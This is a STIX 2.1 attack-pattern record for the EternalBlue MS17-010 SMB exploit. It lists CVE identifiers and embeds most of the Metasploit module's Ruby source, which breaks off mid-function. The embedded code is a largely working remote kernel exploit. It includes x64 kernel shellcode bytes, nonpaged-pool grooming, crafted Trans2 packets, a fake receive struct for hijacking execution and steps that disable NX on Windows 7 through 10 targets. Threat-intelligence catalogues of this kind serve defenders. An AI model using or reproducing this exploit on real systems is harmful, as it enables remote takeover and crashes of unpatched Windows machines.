{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bed80e27-a61d-433e-8f86-5179c28c1458",
    "created": "2024-08-14T16:56:19.985889Z",
    "modified": "2024-08-14T16:56:19.985893Z",
    "name": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
    "description": " This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers.  There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete.  This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again.  The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead.  On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms17_010_eternalblue.rb",
            "external_id": "ms17_010_eternalblue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0143"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0144"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0145"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0146"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0147"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0148"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/RiskSense-Ops/MS17-010"
        },
        {
            "source_name": "reference",
            "url": "https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'ruby_smb'\nrequire 'ruby_smb/smb1/packet'\nrequire 'rubyntlm'\nrequire 'windows_error'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Deprecated\n  include Msf::Exploit::Remote::Tcp\n\n  moved_from 'exploit/windows/smb/ms17_010_eternalblue_win8'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',\n        'Description' => %q{\n          This module is a port of the Equation Group ETERNALBLUE exploit, part of\n          the FuzzBunch toolkit released by Shadow Brokers.\n\n          There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size\n          is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a\n          DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow\n          is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later\n          completed in srvnet!SrvNetWskReceiveComplete.\n\n          This exploit, like the original may not trigger 100% of the time, and should be\n          run continuously until triggered. It seems like the pool will get hot streaks\n          and need a cool down period before the shells rain in again.\n\n          The module will attempt to use Anonymous login, by default, to authenticate to perform the\n          exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use\n          those instead.\n\n          On some systems, this module may cause system instability and crashes, such as a BSOD or\n          a reboot. This may be more likely with some payloads.\n        },\n\n        'Author' =>\n          [\n            # Original Exploit\n            'Equation Group', # OG research and exploit\n            'Shadow Brokers', # Hack and dump\n            'sleepya',        # Research and PoC\n\n            # Original win7 module\n            'Sean Dillon <sean.dillon@risksense.com>', # @zerosum0x0\n            'Dylan Davis <dylan.davis@risksense.com>', # @jennamagius\n            'thelightcosine', # RubySMB refactor and Fallback Credential mode\n\n            # Original win8 module\n            'wvu',             # Babby's first external module\n            'agalway-r7',      # External python module to internal ruby module (sorry wvu)\n            'cdelafuente-r7',  # ruby_smb wizard\n            'cdelafuente-r7', # kernel debugging wizard\n\n            # Combining the two\n            'agalway-r7' # am good at copy pasta\n          ],\n        'License' => MSF_LICENSE,\n        'References' =>\n          [\n            # Win 7\n            ['MSB', 'MS17-010'],\n            ['CVE', '2017-0143'],\n            ['CVE', '2017-0144'],\n            ['CVE', '2017-0145'],\n            ['CVE', '2017-0146'],\n            ['CVE', '2017-0147'],\n            ['CVE', '2017-0148'],\n            ['URL', 'https://github.com/RiskSense-Ops/MS17-010'],\n            ['URL', 'https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf'],\n\n            # Win 8\n            ['EDB', '42030'],\n          ],\n        'DefaultOptions' =>\n          {\n            'CheckModule' => 'auxiliary/scanner/smb/smb_ms17_010',\n            'EXITFUNC' => 'thread',\n            'WfsDelay' => 5\n          },\n        'Privileged' => true,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X64],\n        'Payload' => {\n          'Space' => 2000, # this can be more, needs to be recalculated\n          'EncoderType' => Msf::Encoder::Type::Raw,\n          'DisableNops' => true\n        },\n        'Targets' =>\n          [\n            [ 'Automatic Target', {} ],\n            [\n              'Windows 7',\n              {\n                'os_patterns' => ['Windows 7']\n              }\n            ],\n            [\n              'Windows Embedded Standard 7',\n              {\n                'os_patterns' => ['Windows Embedded Standard 7']\n              }\n            ],\n            [\n              'Windows Server 2008 R2',\n              {\n                'os_patterns' => ['Windows Server 2008 R2']\n              }\n            ],\n            [\n              'Windows 8',\n              {\n                'os_patterns' => ['Windows 8']\n              }\n            ],\n            [\n              'Windows 8.1',\n              {\n                'os_patterns' => ['Windows 8.1']\n              }\n            ],\n            [\n              'Windows Server 2012',\n              {\n                'os_patterns' => ['Windows Server 2012']\n              }\n            ],\n            [\n              'Windows 10 Pro',\n              {\n                'os_patterns' => ['Windows Pro Build']\n              }\n            ],\n            [\n              'Windows 10 Enterprise Evaluation',\n              {\n                'os_patterns' => ['Windows 10 Enterprise Evaluation Build']\n              }\n            ]\n          ],\n        'DefaultTarget' => 0,\n        'Notes' =>\n          {\n            'AKA' => ['ETERNALBLUE']\n          },\n        'DisclosureDate' => '2017-03-14'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOSTS,\n        Opt::RPORT(445),\n        OptString.new('SMBUser', [false, '(Optional) The username to authenticate as', ''], fallbacks: ['USERNAME']),\n        OptString.new('SMBPass', [false, '(Optional) The password for the specified username', ''], fallbacks: ['PASSWORD']),\n        OptString.new('SMBDomain', [\n          false,\n          '(Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,' \\\n            ' Windows Embedded Standard 7 target machines.',\n          ''\n        ]),\n        OptBool.new('VERIFY_TARGET', [\n          true,\n          'Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded' \\\n            ' Standard 7 target machines.',\n          true\n        ]),\n        OptBool.new('VERIFY_ARCH', [\n          true,\n          'Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7,' \\\n            ' Windows Embedded Standard 7 target machines.',\n          true\n        ])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('ProcessName', [true, 'Process to inject payload into.', 'spoolsv.exe']),\n        OptInt.new('GroomAllocations', [true, 'Initial number of times to groom the kernel pool.', 12]),\n        OptInt.new('MaxExploitAttempts', [\n          true,\n          'The number of times to retry the exploit. Useful as EternalBlue can sometimes require multiple attempts to' \\\n          ' get a successful execution.',\n          3\n        ]),\n        OptInt.new('GroomDelta', [\n          true,\n          'The amount to increase the groom count by per try. Only affects Windows Server 2008 R2, Windows 7, Windows' \\\n            ' Embedded Standard 7 target machines.',\n          5\n        ])\n      ]\n    )\n  end\n\n  def generate_process_hash(process)\n    [Rex::Text.ror13_hash(process + \"\\x00\")].pack('l<')\n  end\n\n  # ring3 = user mode encoded payload\n  # proc_name = process to inject APC into\n  def make_kernel_user_payload(ring3, proc_name)\n    proc_hash = generate_process_hash(proc_name)\n\n    sc = (\n      \"\\x55\\xe8\\x2e\\x00\\x00\\x00\\xb9\\x82\\x00\\x00\\xc0\\x0f\\x32\\x4c\\x8d\" \\\n      \"\\x0d\\x34\\x00\\x00\\x00\\x44\\x39\\xc8\\x74\\x19\\x39\\x45\\x00\\x74\\x0a\" \\\n      \"\\x89\\x55\\x04\\x89\\x45\\x00\\xc6\\x45\\xf8\\x00\\x49\\x91\\x50\\x5a\\x48\" \\\n      \"\\xc1\\xea\\x20\\x0f\\x30\\x5d\\xc3\\x48\\x8d\\x2d\\x00\\x10\\x00\\x00\\x48\" \\\n      \"\\xc1\\xed\\x0c\\x48\\xc1\\xe5\\x0c\\x48\\x83\\xed\\x70\\xc3\\x0f\\x01\\xf8\" \\\n      \"\\x65\\x48\\x89\\x24\\x25\\x10\\x00\\x00\\x00\\x65\\x48\\x8b\\x24\\x25\\xa8\" \\\n      \"\\x01\\x00\\x00\\x6a\\x2b\\x65\\xff\\x34\\x25\\x10\\x00\\x00\\x00\\x50\\x50\" \\\n      \"\\x55\\xe8\\xc5\\xff\\xff\\xff\\x48\\x8b\\x45\\x00\\x48\\x83\\xc0\\x1f\\x48\" \\\n      \"\\x89\\x44\\x24\\x10\\x51\\x52\\x41\\x50\\x41\\x51\\x41\\x52\\x41\\x53\\x31\" \\\n      \"\\xc0\\xb2\\x01\\xf0\\x0f\\xb0\\x55\\xf8\\x75\\x14\\xb9\\x82\\x00\\x00\\xc0\" \\\n      \"\\x8b\\x45\\x00\\x8b\\x55\\x04\\x0f\\x30\\xfb\\xe8\\x0e\\x00\\x00\\x00\\xfa\" \\\n      \"\\x41\\x5b\\x41\\x5a\\x41\\x59\\x41\\x58\\x5a\\x59\\x5d\\x58\\xc3\\x41\\x57\" \\\n      \"\\x41\\x56\\x57\\x56\\x53\\x50\\x4c\\x8b\\x7d\\x00\\x49\\xc1\\xef\\x0c\\x49\" \\\n      \"\\xc1\\xe7\\x0c\\x49\\x81\\xef\\x00\\x10\\x00\\x00\\x66\\x41\\x81\\x3f\\x4d\" \\\n      \"\\x5a\\x75\\xf1\\x4c\\x89\\x7d\\x08\\x65\\x4c\\x8b\\x34\\x25\\x88\\x01\\x00\" \\\n      \"\\x00\\xbf\\x78\\x7c\\xf4\\xdb\\xe8\\x01\\x01\\x00\\x00\\x48\\x91\\xbf\\x3f\" \\\n      \"\\x5f\\x64\\x77\\xe8\\xfc\\x00\\x00\\x00\\x8b\\x40\\x03\\x89\\xc3\\x3d\\x00\" \\\n      \"\\x04\\x00\\x00\\x72\\x03\\x83\\xc0\\x10\\x48\\x8d\\x50\\x28\\x4c\\x8d\\x04\" \\\n      \"\\x11\\x4d\\x89\\xc1\\x4d\\x8b\\x09\\x4d\\x39\\xc8\\x0f\\x84\\xc6\\x00\\x00\" \\\n      \"\\x00\\x4c\\x89\\xc8\\x4c\\x29\\xf0\\x48\\x3d\\x00\\x07\\x00\\x00\\x77\\xe6\" \\\n      \"\\x4d\\x29\\xce\\xbf\\xe1\\x14\\x01\\x17\\xe8\\xbb\\x00\\x00\\x00\\x8b\\x78\" \\\n      \"\\x03\\x83\\xc7\\x08\\x48\\x8d\\x34\\x19\\xe8\\xf4\\x00\\x00\\x00\\x3d\" +\n        proc_hash + \"\\x74\\x10\\x3d\" + proc_hash + \"\\x74\\x09\\x48\\x8b\\x0c\" \\\n      \"\\x39\\x48\\x29\\xf9\\xeb\\xe0\\xbf\\x48\\xb8\\x18\\xb8\\xe8\\x84\\x00\\x00\" \\\n      \"\\x00\\x48\\x89\\x45\\xf0\\x48\\x8d\\x34\\x11\\x48\\x89\\xf3\\x48\\x8b\\x5b\" \\\n      \"\\x08\\x48\\x39\\xde\\x74\\xf7\\x4a\\x8d\\x14\\x33\\xbf\\x3e\\x4c\\xf8\\xce\" \\\n      \"\\xe8\\x69\\x00\\x00\\x00\\x8b\\x40\\x03\\x48\\x83\\x7c\\x02\\xf8\\x00\\x74\" \\\n      \"\\xde\\x48\\x8d\\x4d\\x10\\x4d\\x31\\xc0\\x4c\\x8d\\x0d\\xa9\\x00\\x00\\x00\" \\\n      \"\\x55\\x6a\\x01\\x55\\x41\\x50\\x48\\x83\\xec\\x20\\xbf\\xc4\\x5c\\x19\\x6d\" \\\n      \"\\xe8\\x35\\x00\\x00\\x00\\x48\\x8d\\x4d\\x10\\x4d\\x31\\xc9\\xbf\\x34\\x46\" \\\n      \"\\xcc\\xaf\\xe8\\x24\\x00\\x00\\x00\\x48\\x83\\xc4\\x40\\x85\\xc0\\x74\\xa3\" \\\n      \"\\x48\\x8b\\x45\\x20\\x80\\x78\\x1a\\x01\\x74\\x09\\x48\\x89\\x00\\x48\\x89\" \\\n      \"\\x40\\x08\\xeb\\x90\\x58\\x5b\\x5e\\x5f\\x41\\x5e\\x41\\x5f\\xc3\\xe8\\x02\" \\\n      \"\\x00\\x00\\x00\\xff\\xe0\\x53\\x51\\x56\\x41\\x8b\\x47\\x3c\\x41\\x8b\\x84\" \\\n      \"\\x07\\x88\\x00\\x00\\x00\\x4c\\x01\\xf8\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\" \\\n      \"\\x4c\\x01\\xfb\\xff\\xc9\\x8b\\x34\\x8b\\x4c\\x01\\xfe\\xe8\\x1f\\x00\\x00\" \\\n      \"\\x00\\x39\\xf8\\x75\\xef\\x58\\x8b\\x58\\x24\\x4c\\x01\\xfb\\x66\\x8b\\x0c\" \\\n      \"\\x4b\\x8b\\x58\\x1c\\x4c\\x01\\xfb\\x8b\\x04\\x8b\\x4c\\x01\\xf8\\x5e\\x59\" \\\n      \"\\x5b\\xc3\\x52\\x31\\xc0\\x99\\xac\\xc1\\xca\\x0d\\x01\\xc2\\x85\\xc0\\x75\" \\\n      \"\\xf6\\x92\\x5a\\xc3\\x55\\x53\\x57\\x56\\x41\\x57\\x49\\x8b\\x28\\x4c\\x8b\" \\\n      \"\\x7d\\x08\\x52\\x5e\\x4c\\x89\\xcb\\x31\\xc0\\x44\\x0f\\x22\\xc0\\x48\\x89\" \\\n      \"\\x02\\x89\\xc1\\x48\\xf7\\xd1\\x49\\x89\\xc0\\xb0\\x40\\x50\\xc1\\xe0\\x06\" \\\n      \"\\x50\\x49\\x89\\x01\\x48\\x83\\xec\\x20\\xbf\\xea\\x99\\x6e\\x57\\xe8\\x65\" \\\n      \"\\xff\\xff\\xff\\x48\\x83\\xc4\\x30\\x85\\xc0\\x75\\x45\\x48\\x8b\\x3e\"     \\\n      \"\\x48\\x8d\\x35\\x6a\\x00\\x00\\x00\" \\\n      \"\\xb9#{[ ring3.length ].pack('s')}\\x00\\x00\" \\\n      \"\\xf3\\xa4\\x48\\x8b\" \\\n      \"\\x45\\xf0\\x48\\x8b\\x40\\x18\\x48\\x8b\\x40\\x20\\x48\\x8b\\x00\\x66\\x83\" \\\n      \"\\x78\\x48\\x18\\x75\\xf6\\x48\\x8b\\x50\\x50\\x81\\x7a\\x0c\\x33\\x00\\x32\" \\\n      \"\\x00\\x75\\xe9\\x4c\\x8b\\x78\\x20\\xbf\\x5e\\x51\\x5e\\x83\\xe8\\x22\\xff\" \\\n      \"\\xff\\xff\\x48\\x89\\x03\\x31\\xc9\\x88\\x4d\\xf8\\xb1\\x01\\x44\\x0f\\x22\" \\\n      \"\\xc1\\x41\\x5f\\x5e\\x5f\\x5b\\x5d\\xc3\\x48\\x92\\x31\\xc9\\x51\\x51\\x49\" \\\n      \"\\x89\\xc9\\x4c\\x8d\\x05\\x0d\\x00\\x00\\x00\\x89\\xca\\x48\\x83\\xec\\x20\" \\\n      \"\\xff\\xd0\\x48\\x83\\xc4\\x30\\xc3\"\n    )\n    sc << ring3\n    sc\n  end\n\n  def exploit\n    check_code = check\n\n    if check_code.code == 'vulnerable'\n      print_good('The target is vulnerable.')\n    else\n      print_bad('The target is not vulnerable.')\n    end\n\n    if check_code.details[:arch] == ARCH_X86\n      fail_with(Failure::NoTarget, 'This module only supports x64 (64-bit) targets')\n    end\n\n    if datastore['ForceExploit'] == 'true' || check_code.code == 'vulnerable'\n      print_status('Forcing Exploit') if datastore['ForceExploit'] == 'true'\n\n      os = Recog::Nizer.match('smb.native_os', check_code.details[:os])\n\n      if os.nil?\n        if target.name == 'Automatic Target'\n          targs = ''\n          targets[1..-1].each { |t| targs += \"#{t.name}\\n\" }\n\n          msg = \"Could not determine victim OS. If the victim OS is one of the below options:\\n\"\\\n                \"#{targs}\"\\\n                \"\\nThen it can be selected manually with 'set TARGET <OS_NAME>'\"\n          fail_with(Failure::NoTarget, msg)\n        else\n          os = target.name\n        end\n      else\n        os = os['os.product']\n      end\n\n      if os.start_with?('Windows 8', 'Windows 10', 'Windows Server 2012', 'Windows 2012')\n        extend(EternalBlueWin8)\n      else\n        extend(EternalBlueWin7)\n      end\n\n      exploit_eb\n    end\n  end\nend\n\nmodule EternalBlueWin8\n  MAX_SHELLCODE_SIZE = 3712\n\n  # debug mode affects HAL heap. The 0xffffffffffd04000 address should be useable no matter what debug mode is.\n  # The 0xffffffffffd00000 address should be useable when debug mode is not enabled\n  # The 0xffffffffffd01000 address should be useable when debug mode is enabled\n  TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000 # for put fake struct and shellcode\n\n  # because the srvnet buffer is changed dramatically from Windows 7, I have to choose NTFEA size to 0x9000\n  NTFEA_SIZE = 0x9000\n\n  NTLM_FLAGS = Net::NTLM::FLAGS[:KEY56] +\n               Net::NTLM::FLAGS[:KEY128] +\n               Net::NTLM::FLAGS[:TARGET_INFO] +\n               Net::NTLM::FLAGS[:NTLM2_KEY] +\n               Net::NTLM::FLAGS[:NTLM] +\n               Net::NTLM::FLAGS[:REQUEST_TARGET] +\n               Net::NTLM::FLAGS[:UNICODE]\n\n  NTFEA_9000 = (([0, 0, 0].pack('CCS<') + \"\\x00\") * 0x260 + # with these fea, ntfea size is 0x1c80\n    [0, 0, 0x735c].pack('CCS<') + \"\\x00\" * 0x735d + # 0x8fe8 - 0x1c80 - 0xc = 0x735c\n    [0, 0, 0x8147].pack('CCS<') + \"\\x00\" * 0x8148) # overflow to SRVNET_BUFFER_HDR\n\n  NTLM_CRYPT = Rex::Proto::NTLM::Crypt\n\n  # fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()\n  # x64: fake struct is at ffffffff ffd00e00\n  #   offset 0x50:  KSPIN_LOCK\n  #   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.\n  #   offset 0x110: array of pointer to function\n  #   offset 0x13c: set to 3 (DWORD) for invoking ptr to function\n  # some useful offset\n  #   offset 0x120: arg1 when invoking ptr to function\n  #   offset 0x128: arg2 when invoking ptr to function\n  #\n  # code path to get code exception after this struct is controlled\n  # SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr\n  def fake_recv_struct\n    struct = \"\\x00\" * 80\n    struct << [0, TARGET_HAL_HEAP_ADDR + 0x58].pack('QQ<')\n    struct << [TARGET_HAL_HEAP_ADDR + 0x58, 0].pack('QQ<')  # offset 0x60\n    struct << (\"\\x00\" * 16) * 10\n    struct << [TARGET_HAL_HEAP_ADDR + 0x170, 0].pack('QQ<') # offset 0x110: fn_ptr array\n    struct << [(0x8150 ^ 0xffffffffffffffff) + 1, 0].pack('QQ<') # set arg1 to -0x8150\n    struct << [0, 0, 3].pack('QII<') # offset 0x130\n    struct << (\"\\x00\" * 16) * 3\n    struct << [0, TARGET_HAL_HEAP_ADDR + 0x180].pack('QQ<') # shellcode address\n    struct\n  end\n\n  def custom_smb_client\n    sock = Rex::Socket::Tcp.create(\n      'PeerHost' => rhost,\n      'PeerPort' => rport,\n      'Proxies' => proxies,\n      'Context' => {\n        'Msf' => framework,\n        'MsfExploit' => self\n      }\n    )\n\n    dispatcher = RubySMB::Dispatcher::Socket.new(sock)\n\n    client = CustomSessionSetupPacketRubySMBClient.new(dispatcher, smb1: true, smb2: false, smb3: false,\n                                                       username: smb_user, domain: smb_domain, password: smb_pass,\n                                                       ntlm_flags: NTLM_FLAGS)\n\n    return client, sock\n  end\n\n  def smb1_connect_ipc(negotiate_only: false, session_setup_packet: nil, session_setup_auth_packet: nil)\n    begin\n      client, sock = custom_smb_client\n\n      if negotiate_only\n        client.negotiate\n        return client, nil, sock\n      else\n        response_code = client.login(ntlm_flags: NTLM_FLAGS,\n                                     session_setup_packet: session_setup_packet,\n                                     session_setup_auth_packet: session_setup_auth_packet)\n\n        unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS\n          raise RubySMB::Error::UnexpectedStatusCode, \"Error with login: #{response_code}\"\n        end\n\n        tree = client.tree_connect(\"\\\\\\\\#{datastore['RHOST']}\\\\IPC$\")\n      end\n\n      return client, tree, sock\n    rescue StandardError => e\n      print_error(\"Could not make SMBv1 connection. #{e.class} error raised with message '#{e.message}'\")\n      elog('Could not make SMBv1 connection', error: e)\n\n      # for an as of yet undetermined reason, a connection can sometimes be created after an error during an anonymous\n      # login.\n      if client\n        client.disconnect!\n      end\n\n      raise e\n    end\n  end\n\n  def send_trans2_second(conn, tid, pid, data, displacement)\n    pkt = RubySMB::SMB1::Packet::Trans2::RequestSecondary.new\n    pkt.smb_header.tid = tid\n    pkt.smb_header.pid_low = pid\n\n    pkt.parameter_block.total_parameter_count = 0\n    pkt.parameter_block.total_data_count = data.length\n\n    fixed_offset = 32 + 3 + 18\n    pkt.data_block.pad1 = ''\n\n    pkt.parameter_block.parameter_count = 0\n    pkt.parameter_block.parameter_offset = 0\n\n    if !data.empty?\n      pad_len = (4 - fixed_offset % 4) % 4\n\n      if pad_len == 0\n        pkt.data_block.pad1 = ''\n      elsif pad_len == 3\n        pkt.data_block.pad1 = \"\\x00\" * 2\n        pkt.data_block.pad1 = \"\\x00\"\n      else\n        pkt.data_block.pad1 = \"\\x00\" * pad_len\n      end\n    else\n      pkt.data_block.pad1 = ''\n      pad_len = 0\n    end\n\n    pkt.parameter_block.data_count = data.length\n    pkt.parameter_block.data_offset = fixed_offset + pad_len\n    pkt.parameter_block.data_displacement = displacement\n\n    pkt.data_block.trans2_parameters = ''\n    pkt.data_block.trans2_data = data\n\n    pkt.smb_header.flags2.extended_security = 1\n    pkt.smb_header.flags2.paging_io = 0\n    pkt.smb_header.flags2.unicode = 0\n\n    pkt.smb_header.uid = BinData::Bit16le.read(BinData::Bit16.new(2048).to_binary_s)\n\n    conn.send_packet(pkt)\n  end\n\n  # connect to target and send a large nbss size with data 0x80 bytes\n  # this method is for allocating big nonpaged pool on target\n  def create_connection_with_big_smb_first_80(for_nx: false)\n    sock = connect(false)\n    pkt = \"\\x00\".b + \"\\x00\".b + [0x8100].pack('S>')\n    # There is no need to be SMB2 because we want the target free the corrupted buffer.\n    # Also this is invalid SMB2 message.\n    # I believe NSA exploit use SMB2 for hiding alert from IDS\n    # pkt += '\\xfeSMB' # smb2\n    # it can be anything even it is invalid\n    pkt += \"\\x01\\x02\\x03\\x04\"\n\n    if for_nx\n      # MUST set no delay because 1 byte MUST be sent immediately\n      sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)\n      pkt += \"\\x00\" * 0x7b # another byte will be sent later to disabling NX\n    else\n      pkt += \"\\x00\" * 0x7c\n    end\n\n    sock.send(pkt, 0)\n    sock\n  end\n\n  def send_big_trans2(conn, tid, pid, setup, data, param)\n    first_data_fragment_size = data.length % 4096\n\n    pkt = RubySMB::SMB1::Packet::NtTrans::Request.new\n    pkt.smb_header.tid = tid\n\n    pkt.smb_header.pid_low = pid\n\n    command = [setup].pack('S<')\n\n    pkt.parameter_block.max_setup_count = 1\n    pkt.parameter_block.max_parameter_count = param.length\n    pkt.parameter_block.max_data_count = 0\n\n    pkt.parameter_block.setup << 0x0000\n    pkt.parameter_block.total_parameter_count = param.length\n    pkt.parameter_block.total_data_count = data.length\n\n    fixed_offset = 32 + 3 + 38 + command.length\n    if !param.empty?\n      pad_len = (4 - fixed_offset % 4) % 4\n      pad_bytes = \"\\x00\" * pad_len\n      pkt.data_block.pad1 = pad_bytes\n    else\n      pkt.data_block.pad1 = ''\n      pad_len = 0\n    end\n\n    pkt.parameter_block.parameter_count = param.length\n    pkt.parameter_block.parameter_offset = fixed_offset + pad_len\n\n    if !data.empty?\n      pad_len = (4 - (fixed_offset + pad_len + param.length) % 4) % 4\n      pkt.data_block.pad2 = \"\\x00\" * pad_len\n    else\n      pkt.data_block.pad2 = ''\n      pad_len = 0\n    end\n\n    pkt.parameter_block.data_count = first_data_fragment_size\n    pkt.parameter_block.data_offset = pkt.parameter_block.parameter_offset + param.length + pad_len\n\n    pkt.data_block.trans2_parameters = param\n    pkt.data_block.trans2_data = data.first(first_data_fragment_size)\n\n    pkt.smb_header.flags2.paging_io = 0\n    pkt.smb_header.flags2.extended_security = 1\n\n    begin\n      recv_pkt = RubySMB::SMB1::Packet::NtTrans::Response.read(conn.send_recv(pkt))\n    rescue RubySMB::Error::CommunicationError => e\n      print_status('CommunicationError encountered. Have you set SMBUser/SMBPass?')\n      raise e\n    end\n\n    if recv_pkt.status_code.value == 0\n      print_good('got good NT Trans response')\n    else\n      print_error(\"got bad NT Trans response: #{recv_pkt.status_code.name}\\n#{recv_pkt.status_code.description}\")\n      return nil\n    end\n\n    # Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data\n    size_of_data_to_be_sent = first_data_fragment_size\n    while size_of_data_to_be_sent < data.length\n      send_size = [4096, data.length - size_of_data_to_be_sent].min\n      if data.length - size_of_data_to_be_sent <= 4096\n        break\n      end\n\n      send_trans2_second(conn, tid, pid, data[size_of_data_to_be_sent...(size_of_data_to_be_sent + send_size)],\n                         size_of_data_to_be_sent)\n      size_of_data_to_be_sent += send_size\n    end\n\n    size_of_data_to_be_sent\n  end\n\n  def _exploit(fea_list, shellcode, num_groom_conn, username, password)\n    session_setup_packet = default_session_setup_request\n    session_setup_auth_packet = default_session_setup_request\n\n    conn, tree, sock = smb1_connect_ipc(session_setup_packet: session_setup_packet,\n                                        session_setup_auth_packet: session_setup_auth_packet)\n\n    pid = conn.pid\n    os = conn.peer_native_os\n    print_status(\"Target OS: #{os}\")\n\n    if os.start_with?('Windows 10')\n      build = os.split.last.to_i\n      if build >= 14393 # version 1607\n        print_status('This exploit does not support this build')\n        return\n      end\n    elsif !(os.start_with?('Windows 8') || os.start_with?('Windows Server 2012'))\n      print_status('This exploit does not support this target:')\n      return\n    end\n\n    # The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.\n    # Send TRANS2_OPEN2 (0) with special fea_list to a target exce\n    progress = send_big_trans2(conn, tree.id, pid, 0, fea_list, \"\\x00\" * 30)\n    if progress.nil?\n      conn.disconnect!\n      return\n    end\n\n    fea_list_nx = generate_fea_list_nx\n\n    session_setup_packet = default_session_setup_request\n    session_setup_packet.parameter_block.vc_number = 1\n\n    session_setup_auth_packet = default_session_setup_request\n    session_setup_auth_packet.parameter_block.max_mpx_count = 2\n    session_setup_auth_packet.parameter_block.vc_number = 1\n\n    nx_conn, nx_tree, nx_sock = smb1_connect_ipc(session_setup_packet: session_setup_packet,\n                                                 session_setup_auth_packet: session_setup_auth_packet)\n\n    # Another TRANS2_OPEN2 (0) with special fea_list for disabling NX\n    nx_progress = send_big_trans2(nx_conn, nx_tree.id, pid, 0, fea_list_nx, \"\\x00\" * 30)\n    if nx_progress.nil?\n      conn.disconnect!\n      nx_conn.disconnect!\n      return\n    end\n\n    # create some big buffer at servereternal\n    # this buffer MUST NOT be big enough for overflown buffer\n    alloc_conn, alloc_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x2010, username, password, pid)\n    if alloc_conn.nil?\n      return\n    end\n\n    # groom nonpaged pool\n    # when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one\n    srvnet_conn = []\n    num_groom_conn.times { srvnet_conn.append(create_connection_with_big_smb_first_80(for_nx: true)) }\n\n    # create buffer size NTFEA_SIZE at server\n    # this buffer will be replaced by overflown buffer\n    hole_conn, hole_sock = create_session_alloc_non_paged(NTFEA_SIZE - 0x10, username, password, pid)\n    if hole_conn.nil?\n      return\n    end\n\n    # disconnect allocConn to free buffer\n    # expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer\n    alloc_sock.close\n\n    # hope one of srvnet_conn is next to holeConn\n    5.times { srvnet_conn.append(create_connection_with_big_smb_first_80(for_nx: true)) }\n\n    # remove holeConn to create hole for fea buffer\n    hole_sock.close\n\n    # send last fragment to create buffer in hole and OOB write one of srvnet_conn struct header\n    # first trigger, overwrite srvnet buffer struct for disabling NX\n    send_trans2_second(nx_conn, nx_tree.id, pid, fea_list_nx[nx_progress, fea_list_nx.length], nx_progress)\n\n    recv_pkt = RubySMB::SMB1::Packet::Trans2::Response.read(nx_conn.recv_packet)\n    if recv_pkt.status_code.value == 0xc000000d\n      print_good('good response status for nx: INVALID_PARAMETER')\n    else\n      print_error(\"bad response status for nx: #{recv_pkt.status_code.value}\")\n    end\n\n    # one of srvnet_conn struct header should be modified\n    # send '\\x00' to disable nx\n    srvnet_conn.each { |sk| sk.send(\"\\x00\", 0) }\n\n    # send last fragment to create buffer in hole and OOB write one of srvnet_conn struct header\n    # second trigger, place fake struct and shellcode\n    send_trans2_second(conn, tree.id, pid, fea_list[progress, fea_list.length], progress)\n    recv_pkt = RubySMB::SMB1::Packet::Trans2::Response.read(conn.recv_packet)\n    if recv_pkt.status_code.value == 0xc000000d\n      print_good('good response status for nx: INVALID_PARAMETER')\n    else\n      print_error(\"bad response status for nx: #{recv_pkt.status_code.value}\")\n    end\n\n    # one of srvnet_conn struct header should be modified\n    # a corrupted buffer will write recv data in designed memory address\n    srvnet_conn.each { |sk| sk.send(fake_recv_struct + shellcode, 0) }\n\n    